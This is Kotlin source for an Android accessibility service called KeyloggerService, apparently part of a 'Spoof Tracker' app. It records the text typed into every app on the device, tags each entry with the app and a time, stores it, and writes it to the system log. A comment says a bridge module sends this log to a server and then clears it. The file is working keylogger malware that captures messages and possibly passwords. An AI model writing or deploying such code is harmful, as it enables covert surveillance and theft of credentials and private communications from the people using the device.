package bits.personal.spoof.keylogger

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.content.SharedPreferences
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import org.json.JSONArray
import org.json.JSONObject
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

/**
 * KeyloggerService — Android Accessibility Service
 *
 * Listens for TYPE_VIEW_TEXT_CHANGED events across ALL apps.
 * Captured keystrokes are stored in SharedPreferences as a JSON array.
 * The React Native bridge (KeyloggerModule) reads and clears this log.
 *
 * To activate: User must go to Settings → Accessibility → Spoof Tracker → Enable
 */
class KeyloggerService : AccessibilityService() {

    companion object {
        const val PREFS_NAME = "spoof_keylog"
        const val KEY_LOG   = "keylog_entries"
        const val MAX_ENTRIES = 2000   // cap so prefs don't grow forever
        private const val TAG = "SpoofKeylogger"

        /** Called by KeyloggerModule to read the accumulated log */
        fun readLog(context: Context): JSONArray {
            val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            val raw = prefs.getString(KEY_LOG, "[]") ?: "[]"
            return try { JSONArray(raw) } catch (e: Exception) { JSONArray() }
        }

        /** Called by KeyloggerModule after the log is sent to the server */
        fun clearLog(context: Context) {
            context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
                .edit().putString(KEY_LOG, "[]").apply()
        }

        fun appendEntry(context: Context, app: String, text: String) {
            val prefs = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
            val arr = readLog(context)

            // If the last entry is from the same app and within 5 seconds, just append chars
            if (arr.length() > 0) {
                val last = arr.getJSONObject(arr.length() - 1)
                val lastApp = last.optString("app")
                val lastTs  = last.optLong("ts")
                if (lastApp == app && (System.currentTimeMillis() - lastTs) < 5000) {
                    last.put("text", text)  // overwrite with latest full field value
                    last.put("ts", System.currentTimeMillis())
                    prefs.edit().putString(KEY_LOG, arr.toString()).apply()
                    return
                }
            }

            val entry = JSONObject().apply {
                put("app",  app)
                put("text", text)
                put("ts",   System.currentTimeMillis())
                put("time", SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date()))
            }
            arr.put(entry)

            // Trim if over cap
            if (arr.length() > MAX_ENTRIES) {
                val trimmed = JSONArray()
                for (i in (arr.length() - MAX_ENTRIES) until arr.length()) {
                    trimmed.put(arr.get(i))
                }
                prefs.edit().putString(KEY_LOG, trimmed.toString()).apply()
            } else {
                prefs.edit().putString(KEY_LOG, arr.toString()).apply()
            }
        }
    }

    override fun onServiceConnected() {
        val info = AccessibilityServiceInfo().apply {
            eventTypes = AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED or
                         AccessibilityEvent.TYPE_VIEW_FOCUSED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
            notificationTimeout = 100
        }
        serviceInfo = info
        Log.i(TAG, "KeyloggerService connected")
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return
        if (event.eventType != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) return

        val text = event.text?.joinToString("") ?: return
        if (text.isBlank()) return

        // Get the source package name (which app the user is typing in)
        val pkg = event.packageName?.toString() ?: "unknown"

        Log.d(TAG, "Text changed in $pkg: $text")
        appendEntry(applicationContext, pkg, text)
    }

    override fun onInterrupt() {
        Log.w(TAG, "KeyloggerService interrupted")
    }
}
